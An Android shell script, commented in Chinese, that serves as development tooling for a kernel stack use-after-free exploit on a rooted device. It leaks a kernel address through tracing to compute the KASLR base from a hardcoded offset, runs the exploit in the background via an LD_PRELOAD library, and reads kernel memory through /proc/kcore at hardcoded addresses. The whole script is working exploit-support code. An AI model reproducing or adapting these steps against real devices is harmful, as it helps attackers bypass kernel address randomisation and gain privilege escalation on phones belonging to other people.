#!/system/bin/sh
# diagnose_stack_alignment.sh
# 在 rooted violin 设备上运行，诊断 stack-UAF 对齐
#
# 原理：
# 1. 启动 exploit（后台），等它进入 pselect 阻塞
# 2. 用 kcore_read 读取当前线程的内核栈
# 3. 搜索栈上的 readfds 指针（pselect_user_lock 地址）
# 4. 搜索 waiter->lock 字段的位置
# 5. 对比两者的偏移差

PRELOAD=/data/local/tmp/preload.so
KCORE=/data/local/tmp/kcore_read
TRACE=/sdcard/Download/crash.txt

# 获取 KASLR base
echo "=== Step 1: Get KASLR base ==="
echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable
echo 1 > /sys/kernel/tracing/tracing_on
sleep 5

# 从 trace 获取 worker_thread 地址
WORKER_LINE=$(cat /sys/kernel/tracing/trace | grep 'sched_blocked_reason.*worker_thread' | head -1)
WORKER_ADDR=$(echo "$WORKER_LINE" | grep -oP 'caller=0x[0-9a-f]+' | head -1 | cut -d= -f2)
echo "worker_thread addr: $WORKER_ADDR"

# 计算 KASLR base (worker_thread offset = 0xd78e0 from _text)
python3 -c "
worker = int('$WORKER_ADDR', 16)
text = worker - 0xd78e0
print(f'KASLR base (text): 0x{text:016x}')
print(f'pselect_user_lock virtual addr: (need to calculate)')
" 2>/dev/null || echo "Need python3 for KASLR calculation"

# 获取 pselect_user_lock 地址
# 这个地址在 exploit 的全局变量中
# 我们需要从 /proc/<pid>/maps 获取 preload.so 的基址
# 然后计算 pselect_user_lock 的偏移

echo ""
echo "=== Step 2: Find pselect_user_lock address ==="
echo "Looking for preload.so in /proc/*/maps..."

# 找到 exploit 进程
PID=$(ps -ef | grep "LD_PRELOAD.*preload" | grep -v grep | head -1 | awk '{print $2}')
if [ -z "$PID" ]; then
    echo "Exploit not running. Starting it in background..."
    CFI_KASLR_BASE=0x$(python3 -c "print(f'0x{int(\"$WORKER_ADDR\", 16) - 0xd78e0:016x}')" 2>/dev/null || echo "ffffffd692800000") \
        LD_PRELOAD=$PRELOAD /system/bin/id &
    sleep 2
    PID=$(ps -ef | grep "LD_PRELOAD.*preload" | grep -v grep | head -1 | awk '{print $2}')
fi
echo "Exploit PID: $PID"

if [ -n "$PID" ]; then
    # 获取 preload.so 的基址
    PRELOAD_BASE=$(cat /proc/$PID/maps | grep preload.so | head -1 | cut -d- -f1)
    echo "preload.so base: $PRELOAD_BASE"

    # pselect_user_lock 在 preload.so 的 .bss 段
    # 需要从 ELF 获取偏移
    # 简化：直接搜索栈上的特征值
fi

echo ""
echo "=== Step 3: Read kernel stack via kcore ==="
echo "Waiting for exploit to enter pselect..."
sleep 10

# 获取当前 CPU 的内核栈
# /proc/kcore 是 ELF 格式的内核内存映射
# 我们需要找到 exploit 线程的内核栈

# 方法：用 kcore_read 读取已知的内核地址来验证
# 先读取 init_task 验证 kcore 可用
echo "Testing kcore_read..."
$KCORE 0xffffffd694ad4580 8 /tmp/test.bin 2>/dev/null
if [ -f /tmp/test.bin ]; then
    echo "kcore_read works!"
    xxd /tmp/test.bin | head -1
else
    echo "kcore_read failed. Need root."
fi

echo ""
echo "=== Step 4: Check boot_id ==="
cat /proc/sys/kernel/random/boot_id
echo ""
echo "=== Done ==="
echo "Next: analyze crash.txt for stack alignment clues"
cat $TRACE 2>/dev/null | grep -E "REQUEUE|FOPSROUTE|STEP" | tail -20
